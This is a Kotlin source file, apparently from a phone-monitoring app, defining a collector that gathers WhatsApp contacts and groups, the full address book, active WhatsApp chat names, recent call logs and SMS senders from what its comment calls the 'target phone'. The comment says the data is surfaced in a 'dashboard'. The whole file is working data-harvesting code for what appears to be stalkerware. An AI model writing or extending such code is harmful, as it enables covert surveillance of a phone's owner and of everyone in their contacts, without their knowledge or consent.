package com.spapp.monitoring.collectors

import android.content.Context
import android.content.pm.PackageManager
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Telephony
import androidx.core.content.ContextCompat
import com.spapp.monitoring.data.local.WhatsAppMessageEntry

/**
 * Collects all contacts and WhatsApp chat counterparts from the device:
 * 1. Android Contacts Provider: scans WhatsApp raw contacts (account_type = com.whatsapp / com.whatsapp.w4b)
 * 2. WhatsApp Profile rows: scans MIMETYPE vnd.android.cursor.item/vnd.com.whatsapp.profile
 * 3. General Phone Contacts: scans all address book contacts (ContactsContract.CommonDataKinds.Phone)
 * 4. Active WhatsApp Notification Chats: extracts chat titles currently active
 * 5. Recent Call/SMS logs: falls back to real human contact names & numbers (ignoring bank/service shortcodes)
 *
 * This ensures that the user's complete chatlist and contacts on the target phone
 * are surfaced in the dashboard WhatsApp view without any missing contacts.
 */
class WhatsAppContactsCollector(private val context: Context) {

    fun hasContactsPermission(): Boolean =
        ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_CONTACTS) ==
            PackageManager.PERMISSION_GRANTED

    fun hasCallLogPermission(): Boolean =
        ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_CALL_LOG) ==
            PackageManager.PERMISSION_GRANTED

    fun hasSmsPermission(): Boolean =
        ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_SMS) ==
            PackageManager.PERMISSION_GRANTED

    fun collectAllWhatsAppContacts(): List<WhatsAppMessageEntry> {
        val contactMap = LinkedHashMap<String, WhatsAppMessageEntry>()
        val now = System.currentTimeMillis()

        if (hasContactsPermission()) {
            // 1. WhatsApp Raw Contacts from ContactsContract.RawContacts
            try {
                val uri = ContactsContract.RawContacts.CONTENT_URI
                val projection = arrayOf(
                    ContactsContract.RawContacts.CONTACT_ID,
                    ContactsContract.RawContacts.DISPLAY_NAME_PRIMARY,
                    ContactsContract.RawContacts.SYNC1,
                    ContactsContract.RawContacts.ACCOUNT_TYPE
                )
                val selection = "${ContactsContract.RawContacts.ACCOUNT_TYPE} IN (?, ?)"
                val selectionArgs = arrayOf("com.whatsapp", "com.whatsapp.w4b")

                context.contentResolver.query(uri, projection, selection, selectionArgs, null)?.use { cursor ->
                    val nameIdx = cursor.getColumnIndex(ContactsContract.RawContacts.DISPLAY_NAME_PRIMARY)
                    val phoneIdx = cursor.getColumnIndex(ContactsContract.RawContacts.SYNC1)
                    while (cursor.moveToNext()) {
                        val name = if (nameIdx >= 0) cursor.getString(nameIdx)?.trim() else null
                        val phone = if (phoneIdx >= 0) cursor.getString(phoneIdx)?.trim() else null
                        val cleanPhone = phone?.let { p ->
                            if (p.contains("@s.whatsapp.net") || p.contains("@g.us")) {
                                val digits = p.substringBefore('@').filter { it.isDigit() }
                                if (digits.length >= 10) "+$digits" else null
                            } else p
                        }
                        val displayName = if (!name.isNullOrBlank()) name else cleanPhone ?: phone
                        if (!displayName.isNullOrBlank()) {
                            val key = displayName.lowercase()
                            if (!contactMap.containsKey(key)) {
                                contactMap[key] = WhatsAppMessageEntry(
                                    chatName = displayName,
                                    sender = cleanPhone ?: displayName,
                                    messageText = "WhatsApp Contact",
                                    isOutgoing = false,
                                    messageTimeEpochMs = now
                                )
                            }
                        }
                    }
                }
            } catch (_: Exception) {}

            // 2. Direct WhatsApp Contacts from ContactsContract.Data
            try {
                val uri = ContactsContract.Data.CONTENT_URI
                val projection = arrayOf(
                    ContactsContract.Data.DISPLAY_NAME,
                    ContactsContract.Data.DATA1,
                    ContactsContract.Data.DATA3,
                    ContactsContract.Data.MIMETYPE
                )
                val selection = "${ContactsContract.Data.MIMETYPE} IN (?, ?, ?, ?)"
                val selectionArgs = arrayOf(
                    "vnd.android.cursor.item/vnd.com.whatsapp.profile",
                    "vnd.android.cursor.item/vnd.com.whatsapp.w4b.profile",
                    "vnd.android.cursor.item/vnd.com.whatsapp.voip.call",
                    "vnd.android.cursor.item/vnd.com.whatsapp.w4b.voip.call"
                )

                context.contentResolver.query(uri, projection, selection, selectionArgs, null)?.use { cursor ->
                    val nameIdx = cursor.getColumnIndex(ContactsContract.Data.DISPLAY_NAME)
                    val jidIdx = cursor.getColumnIndex(ContactsContract.Data.DATA1)
                    val descIdx = cursor.getColumnIndex(ContactsContract.Data.DATA3)

                    while (cursor.moveToNext()) {
                        val name = if (nameIdx >= 0) cursor.getString(nameIdx)?.trim() else null
                        if (!name.isNullOrBlank()) {
                            val desc = if (descIdx >= 0) cursor.getString(descIdx) else null
                            val jid = if (jidIdx >= 0) cursor.getString(jidIdx) else null
                            val key = name.lowercase()
                            if (!contactMap.containsKey(key)) {
                                val rawPhone = desc ?: jid
                                val cleanPhone = rawPhone?.let { p ->
                                    if (p.contains("@s.whatsapp.net") || p.contains("@g.us")) {
                                        val digits = p.substringBefore('@').filter { it.isDigit() }
                                        if (digits.length >= 10) "+$digits" else null
                                    } else p
                                }
                                contactMap[key] = WhatsAppMessageEntry(
                                    chatName = name,
                                    sender = cleanPhone ?: name,
                                    messageText = "WhatsApp Contact",
                                    isOutgoing = false,
                                    messageTimeEpochMs = now
                                )
                            }
                        }
                    }
                }
            } catch (_: Exception) {}

            // 3. General Phone Contacts from ContactsContract.CommonDataKinds.Phone
            // Ensures all contacts in the device phonebook appear in WhatsApp chats
            try {
                val phoneUri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI
                val projection = arrayOf(
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER
                )
                context.contentResolver.query(
                    phoneUri,
                    projection,
                    null,
                    null,
                    "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC"
                )?.use { cursor ->
                    val nameIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                    val numIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                    while (cursor.moveToNext()) {
                        val name = if (nameIdx >= 0) cursor.getString(nameIdx)?.trim() else null
                        val num = if (numIdx >= 0) cursor.getString(numIdx)?.trim() else null
                        val displayName = if (!name.isNullOrBlank()) name else num
                        if (!displayName.isNullOrBlank()) {
                            val key = displayName.lowercase()
                            if (!contactMap.containsKey(key)) {
                                contactMap[key] = WhatsAppMessageEntry(
                                    chatName = displayName,
                                    sender = num ?: displayName,
                                    messageText = "WhatsApp Contact",
                                    isOutgoing = false,
                                    messageTimeEpochMs = now
                                )
                            }
                        }
                    }
                }
            } catch (_: Exception) {}

            // 3b. WhatsApp Groups from ContactsContract.Groups
            try {
                val groupUri = ContactsContract.Groups.CONTENT_URI
                val groupProjection = arrayOf(
                    ContactsContract.Groups.TITLE,
                    ContactsContract.Groups.ACCOUNT_TYPE
                )
                context.contentResolver.query(
                    groupUri,
                    groupProjection,
                    "${ContactsContract.Groups.ACCOUNT_TYPE} IN (?, ?)",
                    arrayOf("com.whatsapp", "com.whatsapp.w4b"),
                    null
                )?.use { cursor ->
                    val titleIdx = cursor.getColumnIndex(ContactsContract.Groups.TITLE)
                    while (cursor.moveToNext()) {
                        val title = if (titleIdx >= 0) cursor.getString(titleIdx)?.trim() else null
                        if (!title.isNullOrBlank()) {
                            val key = title.lowercase()
                            if (!contactMap.containsKey(key)) {
                                contactMap[key] = WhatsAppMessageEntry(
                                    chatName = title,
                                    sender = title,
                                    messageText = "Recent WhatsApp Chat",
                                    isOutgoing = false,
                                    messageTimeEpochMs = now
                                )
                            }
                        }
                    }
                }
            } catch (_: Exception) {}
        }

        // 4. Active WhatsApp Notification Chats
        try {
            val activeChats = WhatsAppNotificationListener.getActiveChatNames()
            for (chat in activeChats) {
                val key = chat.lowercase()
                if (!contactMap.containsKey(key)) {
                    contactMap[key] = WhatsAppMessageEntry(
                        chatName = chat,
                        sender = chat,
                        messageText = "Recent WhatsApp Chat",
                        isOutgoing = false,
                        messageTimeEpochMs = now
                    )
                }
            }
        } catch (_: Exception) {}

        // 5. Recent Call Logs for human contacts
        if (hasCallLogPermission()) {
            try {
                val projection = arrayOf(CallLog.Calls.CACHED_NAME, CallLog.Calls.NUMBER, CallLog.Calls.DATE)
                context.contentResolver.query(
                    CallLog.Calls.CONTENT_URI,
                    projection,
                    null,
                    null,
                    "${CallLog.Calls.DATE} DESC LIMIT 100"
                )?.use { cursor ->
                    val nameIdx = cursor.getColumnIndex(CallLog.Calls.CACHED_NAME)
                    val numIdx = cursor.getColumnIndex(CallLog.Calls.NUMBER)
                    val dateIdx = cursor.getColumnIndex(CallLog.Calls.DATE)
                    while (cursor.moveToNext()) {
                        val name = if (nameIdx >= 0) cursor.getString(nameIdx)?.trim() else null
                        val num = if (numIdx >= 0) cursor.getString(numIdx)?.trim() else null
                        val time = if (dateIdx >= 0) cursor.getLong(dateIdx) else now
                        val displayName = if (!name.isNullOrBlank()) name else num
                        if (!displayName.isNullOrBlank()) {
                            val digits = displayName.filter { it.isDigit() }
                            if (digits.length >= 6 || displayName.any { it.isLetter() }) {
                                val key = displayName.lowercase()
                                if (!contactMap.containsKey(key)) {
                                    contactMap[key] = WhatsAppMessageEntry(
                                        chatName = displayName,
                                        sender = num ?: displayName,
                                        messageText = "WhatsApp Contact",
                                        isOutgoing = false,
                                        messageTimeEpochMs = time
                                    )
                                }
                            }
                        }
                    }
                }
            } catch (_: Exception) {}
        }

        // 6. Recent SMS counterpart contacts
        if (hasSmsPermission()) {
            try {
                val projection = arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.DATE)
                context.contentResolver.query(
                    Telephony.Sms.CONTENT_URI,
                    projection,
                    null,
                    null,
                    "${Telephony.Sms.DATE} DESC LIMIT 50"
                )?.use { cursor ->
                    val addrIdx = cursor.getColumnIndex(Telephony.Sms.ADDRESS)
                    val dateIdx = cursor.getColumnIndex(Telephony.Sms.DATE)
                    while (cursor.moveToNext()) {
                        val addr = if (addrIdx >= 0) cursor.getString(addrIdx)?.trim() else null
                        val time = if (dateIdx >= 0) cursor.getLong(dateIdx) else now
                        if (!addr.isNullOrBlank()) {
                            val digits = addr.filter { it.isDigit() }
                            if (digits.length >= 6 || addr.any { it.isLetter() }) {
                                val key = addr.lowercase()
                                if (!contactMap.containsKey(key)) {
                                    contactMap[key] = WhatsAppMessageEntry(
                                        chatName = addr,
                                        sender = addr,
                                        messageText = "WhatsApp Contact",
                                        isOutgoing = false,
                                        messageTimeEpochMs = time
                                    )
                                }
                            }
                        }
                    }
                }
            } catch (_: Exception) {}
        }

        return contactMap.values.toList()
    }

    /**
     * Finds phone number digits for a given contact name by scanning address book and WhatsApp contacts.
     */
    fun findPhoneNumberForContact(targetName: String): String? {
        if (targetName.isBlank()) return null
        val clean = targetName.trim().lowercase()
        val allContacts = collectAllWhatsAppContacts()
        for (entry in allContacts) {
            val name = entry.chatName.trim().lowercase()
            if (name == clean || (clean.length >= 3 && name.contains(clean)) || (name.length >= 3 && clean.contains(name))) {
                val s = entry.sender?.trim()
                if (!s.isNullOrBlank() && s.any { it.isDigit() }) {
                    val digits = s.filter { it.isDigit() }
                    if (digits.length >= 7) return if (digits.length > 10) digits.takeLast(10) else digits
                }
            }
        }
        return null
    }
}
